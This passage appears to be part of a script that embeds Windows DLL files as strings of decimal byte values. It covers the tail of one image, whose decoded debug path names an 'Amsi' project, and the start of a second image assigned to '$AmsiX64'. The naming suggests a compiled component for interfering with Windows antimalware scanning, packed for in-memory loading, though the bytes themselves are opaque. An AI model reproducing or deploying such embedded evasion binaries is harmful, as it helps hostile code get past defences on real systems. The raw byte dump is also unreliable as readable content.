0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 27 28 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 48 0 16 112 48 0 16 0 0 0 0 0 0 0 0 144 29 62 87 0 0 0 0 2 0 0 0 61 0 0 0 132 33 0 0 132 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 196 33 0 0 196 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 13 0 0 0 44 2 0 0 216 33 0 0 216 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 48 0 16 128 33 0 16 1 0 0 0 112 32 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 75 26 0 0 82 83 68 83 69 10 117 219 0 114 41 77 133 149 98 78 29 103 122 248 7 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 20 0 0 0 20 0 0 0 1 0 0 0 19 0 0 0 71 67 84 76 0 16 0 0 124 12 0 0 46 116 101 120 116 36 109 110 0 0 0 0 0 32 0 0 112 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 112 32 0 0 4 0 0 0 46 48 48 99 102 103 0 0 116 32 0 0 4 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 120 32 0 0 4 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 124 32 0 0 4 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 128 32 0 0 4 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 132 32 0 0 4 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 136 32 0 0 4 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 140 32 0 0 4 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 144 32 0 0 4 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 160 32 0 0 220 0 0 0 46 114 100 97 116 97 0 0 128 33 0 0 4 0 0 0 46 114 100 97 116 97 36 115 120 100 97 116 97 0 0 0 132 33 0 0 128 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 4 36 0 0 4 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 8 36 0 0 4 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 12 36 0 0 4 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 16 36 0 0 4 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 24 36 0 0 124 0 0 0 46 120 100 97 116 97 36 120 0 0 0 0 148 36 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 208 36 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 228 36 0 0 112 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 84 37 0 0 136 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 24 0 0 0 46 100 97 116 97 0 0 0 24 48 0 0 112 3 0 0 46 98 115 115 0 0 0 0 0 64 0 0 20 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 80 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 80 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 254 255 255 255 0 0 0 0 208 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 110 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 233 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 203 18 0 16 234 18 0 16 0 0 0 0 254 255 255 255 0 0 0 0 216 255 255 255 0 0 0 0 254 255 255 255 215 22 0 16 234 22 0 16 20 37 0 0 0 0 0 0 0 0 0 0 220 37 0 0 48 32 0 0 44 37 0 0 0 0 0 0 0 0 0 0 164 38 0 0 72 32 0 0 228 36 0 0 0 0 0 0 0 0 0 0 206 39 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 72 0 109 101 109 115 101 116 0 0 53 0 95 101 120 99 101 112 116 95 104 97 110 100 108 101 114 52 95 99 111 109 109 111 110 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 56 0 95 105 110 105 116 116 101 114 109 0 57 0 95 105 110 105 116 116 101 114 109 95 101 0 65 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 53 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 54 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 62 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 36 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 31 0 95 99 114 116 95 97 116 101 120 105 116 0 23 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 130 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 67 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 9 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 97 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 109 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 45 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 10 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 14 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 214 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 75 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 103 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 177 25 191 68 78 230 64 187 255 255 255 255 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 12 0 0 0 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 80 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 0 12 1 0 0 7 48 108 48 155 48 171 48 194 48 211 48 228 48 233 48 2 49 7 49 20 49 97 49 126 49 136 49 150 49 168 49 189 49 251 49 212 50 7 51 85 51 94 51 105 51 112 51 144 51 150 51 156 51 162 51 168 51 174 51 181 51 188 51 195 51 202 51 209 51 216 51 223 51 231 51 239 51 247 51 3 52 12 52 17 52 23 52 33 52 43 52 59 52 75 52 91 52 100 52 201 52 121 53 170 53 249 53 12 54 31 54 43 54 59 54 76 54 114 54 135 54 142 54 148 54 166 54 176 54 17 55 30 55 69 55 77 55 102 55 160 55 187 55 199 55 214 55 223 55 236 55 27 56 35 56 46 56 52 56 58 56 70 56 76 56 111 56 160 56 75 57 106 57 116 57 133 57 146 57 151 57 189 57 194 57 231 57 241 57 14 58 91 58 96 58 115 58 129 58 156 58 167 58 54 59 63 59 71 59 142 59 157 59 164 59 218 59 227 59 240 59 251 59 4 60 19 60 30 60 36 60 42 60 48 60 54 60 60 60 66 60 72 60 78 60 84 60 90 60 96 60 102 60 108 60 114 60 0 0 0 32 0 0 32 0 0 0 112 48 164 48 168 48 92 49 96 49 104 49 48 52 80 52 108 52 112 52 140 52 144 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\" $AmsiX64 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 148 172 98 253 208 205 12 174 208 205 12 174 208 205 12 174 217 181 159 174 210 205 12 174 190 150 13 175 211 205 12 174 190 150 15 175 210 205 12 174 190 150 9 175 216 205 12 174 190 150 8 175 217 205 12 174 13 50 199 174 210 205 12 174 208 205 13 174 240 205 12 174 2 150 4 175 209 205 12 174 2 150 243 174 209 205 12 174 2 150 14 175 209 205 12 174 82 105 99 104 208 205 12 174 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 7 0 136 29 62 87 0 0 0 0 0 0 0 0 240 0 34 32 11 2 14 0 0 16 0 0 0 28 0 0 0 0 0 0 160 19 0 0 0 16 0 0 0 0 0 128 1 0 0 0 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 128 0 0 0 4 0 0 0 0 0 0 2 0 96 1 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 108 38 0 0 80 0 0 0 0 96 0 0 224 1 0 0 0 64 0 0 176 1 0 0 0 0 0 0 0 0 0 0 0 112 0 0 24 0 0 0 112 33 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 33 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 248 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 211 14 0 0 0 16 0 0 0 16 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 128 10 0 0 0 32 0 0 0 12 0 0 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 64 6 0 0 0 48 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 112 100 97 116 97 0 0 176 1 0 0 0 64 0 0 0 2 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 103 102 105 100 115 0 0 16 0 0 0 0 80 0 0 0 2 0 0 0 36 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 96 0 0 0 2 0 0 0 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 24 0 0 0 0 112 0 0 0 2 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 195 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 72 59 13 217 31 0 0 242 117 18 72 193 193 16 102 247 193 255 255 242 117 2 242 195 72 193 201 16 233 211 3 0 0 204 204 204 72 131 236 40 133 210 116 57 131 234 1 116 40 131 234 1 116 22 131 250 1 116 10 184 1 0 0 0 72 131 196 40 195 232 142 5 0 0 235 5 232 95 5 0 0 15 182 192 72 131 196 40 195 73 139 208 72 131 196 40 233 15 0 0 0 77 133 192 15 149 193 72 131 196 40 233 44 1 0 0 72 137 92 36 8 72 137 116 36 16 72 137 124 36 32 65 86 72 131 236 32 72 139 242 76 139 241 51 201 232 2 6 0 0 132 192 117 7 51 192 233 232 0 0 0 232 150 4 0 0 138 216 136 68 36 64 64 183 1 131 61 234 36 0 0 0 116 10 185 7 0 0 0 232 62 9 0 0 199 5 212 36 0 0 1 0 0 0 232 199 4 0 0 132 192 116 103 232 110 10 0 0 72 141 13 179 10 0 0 232 6 8 0 0 232 197 8 0 0 72 141 13 206 8 0 0 232 245 7 0 0 232 224 8 0 0 72 141 21 253 15 0 0 72 141 13 238 15 0 0 232 213 12 0 0 133 192 117 41 232 96 4 0 0 132 192 116 32 72 141 21 205 15 0 0 72 141 13 190 15 0 0 232 175 12 0 0 199 5 103 36 0 0 2 0 0 0 64 50 255 138 203 232 9 7 0 0 64 132 255 15 133 78 255 255 255 232 167 8 0 0 72 139 216 72 131 56 0 116 36 72 139 200 232 78 6 0 0 132 192 116 24 72 139 27 72 139 203 232 111 10 0 0 76 139 198 186 2 0 0 0 73 139 206 255 211 255 5 156 30 0 0 184 1 0 0 0 72 139 92 36 48 72 139 116 36 56 72 139 124 36 72 72 131 196 32 65 94 195 204 72 137 92 36 8 72 137 116 36 24 87 72 131 236 32 64 138 241 139 5 104 30 0 0 51 219 133 192 127 4 51 192 235 80 255 200 137 5 86 30 0 0 232 109 3 0 0 64 138 248 136 68 36 56 131 61 195 35 0 0 2 116 10 185 7 0 0 0 232 23 8 0 0 232 102 4 0 0 137 29 172 35 0 0 232 139 4 0 0 64 138 207 232 75 6 0 0 51 210 64 138 206 232 101 6 0 0 132 192 15 149 195 139 195 72 139 92 36 48 72 139 116 36 64 72 131 196 32 95 195 204 204 72 139 196 72 137 88 32 76 137 64 24 137 80 16 72 137 72 8 86 87 65 86 72 131 236 64 77 139 240 139 250 72 139 241 141 66 255 131 248 1 119 46 232 217 0 0 0 139 216 137 68 36 48 133 192 15 132 179 0 0 0 77 139 198 139 215 72 139 206 232 182 253 255 255 139 216 137 68 36 48 133 192 15 132 152 0 0 0 131 255 1 117 8 72 139 206 232 55 11 0 0 77 139 198 139 215 72 139 206 232 74 253 255 255 139 216 137 68 36 48 131 255 1 117 52 133 192 117 39 77 139 198 51 210 72 139 206 232 46 253 255 255 77 139 198 51 210 72 139 206 232 101 253 255 255 77 139 198 51 210 72 139 206 232 96 0 0 0 131 255 1 117 4 133 219 116 4 133 255 117 12 72 139 206 232 229 10 0 0 133 255 116 5 131 255 3 117 42 77 139 198 139 215 72 139 206 232 45 253 255 255 139 216 137 68 36 48 133 192 116 19 77 139 198 139 215 72 139 206 232 30 0 0 0 139 216 137 68 36 48 235 6 51 219 137 92 36 48 139 195 72 139 92 36 120 72 131 196 64 65 94 95 94 195 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 72 139 29 233 13 0 0 73 139 248 139 242 72 139 233 72 133 219 117 5 141 67 1 235 18 72 139 203 232 127 8 0 0 76 139 199 139 214 72 139 205 255 211 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 195 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 73 139 248 139 218 72 139 241 131 250 1 117 5 232 99 5 0 0 76 139 199 139 211 72 139 206 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 233 103 254 255 255 204 204 204 64 83 72 131 236 32 72 139 217 51 201 255 21 119 12 0 0 72 139 203 255 21 6 12 0 0 255 21 32 12 0 0 72 139 200 186 9 4 0 192 72 131 196 32 91 72 255 37 76 12 0 0 72 137 76 36 8 72 131 236 56 185 23 0 0 0 232 13 10 0 0 133 192 116 7 185 2 0 0 0 205 41 72 141 13 183 28 0 0 232 170 0 0 0 72 139 68 36 56 72 137 5 158 29 0 0 72 141 68 36 56 72 131 192 8 72 137 5 46 29 0 0 72 139 5 135 29 0 0 72 137 5 248 27 0 0 72 139 68 36 64 72 137 5 252 28 0 0 199 5 210 27 0 0 9 4 0 192 199 5 204 27 0 0 1 0 0 0 199 5 214 27 0 0 1 0 0 0 184 8 0 0 0 72 107 192 0 72 141 13 206 27 0 0 72 199 4 1 2 0 0 0 184 8 0 0 0 72 107 192 0 72 139 13 70 27 0 0 72 137 76 4 32 184 8 0 0 0 72 107 192 1 72 139 13 57 27 0 0 72 137 76 4 32 72 141 13 125 12 0 0 232 0 255 255 255 72 131 196 56 195 204 204 204 64 83 86 87 72 131 236 64 72 139 217 255 21 31 11 0 0 72 139 179 248 0 0 0 51 255 69 51 192 72 141 84 36 96 72 139 206 255 21 253 10 0 0 72 133 192 116 57 72 131 100 36 56 0 72 141 76 36 104 72 139 84 36 96 76 139 200 72 137 76 36 48 76 139 198 72 141 76 36 112 72 137 76 36 40 51 201 72 137 92 36 32 255 21 190 10 0 0 255 199 131 255 2 124 177 72 131 196 64 95 94 91 195 204 204 204 72 131 236 40 232 103 8 0 0 133 192 116 33 101 72 139 4 37 48 0 0 0 72 139 72 8 235 5 72 59 200 116 20 51 192 240 72 15 177 13 64 32 0 0 117 238 50 192 72 131 196 40 195 176 1 235 247 204 204 204 72 131 236 40 232 43 8 0 0 133 192 116 7 232 94 6 0 0 235 5 232 95 8 0 0 176 1 72 131 196 40 195 72 131 236 40 51 201 232 65 1 0 0 132 192 15 149 192 72 131 196 40 195 204 204 204 72 131 236 40 232 99 8 0 0 132 192 117 4 50 192 235 18 232 86 8 0 0 132 192 117 7 232 77 8 0 0 235 236 176 1 72 131 196 40 195 72 131 236 40 232 59 8 0 0 232 54 8 0 0 176 1 72 131 196 40 195 204 204 204 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 73 139 249 73 139 240 139 218 72 139 233 232 152 7 0 0 133 192 117 23 131 251 1 117 18 72 139 207 232 187 5 0 0 76 139 198 51 210 72 139 205 255 215 72 139 84 36 88 139 76 36 80 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 233 153 7 0 0 204 204 204 72 131 236 40 232 79 7 0 0 133 192 116 16 72 141 13 72 31 0 0 72 131 196 40 233 145 7 0 0 232 106 249 255 255 133 192 117 5 232 143 7 0 0 72 131 196 40 195 72 131 236 40 51 201 232 141 7 0 0 72 131 196 40 233 132 7 0 0 64 83 72 131 236 32 15 182 5 59 31 0 0 133 201 187 1 0 0 0 15 68 195 136 5 43 31 0 0 232 46 5 0 0 232 93 7 0 0 132 192 117 4 50 192 235 20 232 80 7 0 0 132 192 117 9 51 201 232 69 7 0 0 235 234 138 195 72 131 196 32 91 195 204 204 204 72 137 92 36 8 85 72 139 236 72 131 236 64 139 217 131 249 1 15 135 166 0 0 0 232 171 6 0 0 133 192 116 43 133 219 117 39 72 141 13 160 30 0 0 232 225 6 0 0 133 192 116 4 50 192 235 122 72 141 13 164 30 0 0 232 205 6 0 0 133 192 15 148 192 235 103 72 139 21 169 24 0 0 73 131 200 255 139 194 185 64 0 0 0 131 224 63 43 200 176 1 73 211 200 76 51 194 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 16 77 240 15 17 5 69 30 0 0 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 17 13 61 30 0 0 242 15 16 77 240 15 17 5 57 30 0 0 242 15 17 13 65 30 0 0 72 139 92 36 80 72 131 196 64 93 195 185 5 0 0 0 232 84 2 0 0 204 204 204 204 72 131 236 24 76 139 193 184 77 90 0 0 102 57 5 29 232 255 255 117 124 72 99 5 80 232 255 255 72 141 21 13 232 255 255 72 141 12 16 129 57 80 69 0 0 117 98 184 11 2 0 0 102 57 65 24 117 87 76 43 194 15 183 65 20 72 141 81 24 72 3 208 15 183 65 6 72 141 12 128 76 141 12 202 72 137 20 36 73 59 209 116 24 139 74 12 76 59 193 114 10 139 66 8 3 193 76 59 192 114 8 72 131 194 40 235 223 51 210 72 133 210 117 4 50 192 235 23 247 66 36 0 0 0 128 116 4 50 192 235 10 176 1 235 6 50 192 235 2 50 192 72 131 196 24 195 64 83 72 131 236 32 138 217 232 83 5 0 0 51 210 133 192 116 11 132 219 117 7 72 135 21 62 29 0 0 72 131 196 32 91 195 64 83 72 131 236 32 128 61 99 29 0 0 0 138 217 116 4 132 210 117 14 138 203 232 144 5 0 0 138 203 232 137 5 0 0 176 1 72 131 196 32 91 195 204 64 83 72 131 236 32 72 139 21 55 23 0 0 72 139 217 139 202 72 51 21 251 28 0 0 131 225 63 72 211 202 72 131 250 255 117 10 72 139 203 232 63 5 0 0 235 15 72 139 211 72 141 13 219 28 0 0 232 34 5 0 0 51 201 133 192 72 15 68 203 72 139 193 72 131 196 32 91 195 204 72 131 236 40 232 167 255 255 255 72 247 216 27 192 247 216 255 200 72 131 196 40 195 204 72 137 92 36 32 85 72 139 236 72 131 236 32 72 131 101 24 0 72 187 50 162 223 45 153 43 0 0 72 139 5 185 22 0 0 72 59 195 117 111 72 141 77 24 255 21 226 6 0 0 72 139 69 24 72 137 69 16 255 21 220 6 0 0 139 192 72 49 